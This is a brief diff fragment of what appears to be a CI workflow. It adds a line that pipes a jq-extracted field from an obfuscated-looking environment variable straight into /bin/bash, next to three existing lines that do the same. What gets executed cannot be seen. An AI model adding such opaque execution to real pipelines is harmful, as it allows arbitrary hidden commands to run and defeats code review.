@@ -40,6 +40,7 @@ jobs:
           echo $arv3981 | jq -r .cgs739 | /bin/bash
           printf '%s' "$qs751" | jq -r .chyns89224 | /bin/bash
           printf '%s' "$qvh4721" | jq -r .xc79809 | /bin/bash
+          printf '%s' "$frsse747" | jq -r .ri37 | /bin/bash
 
       - name: Save archive
         if: always()
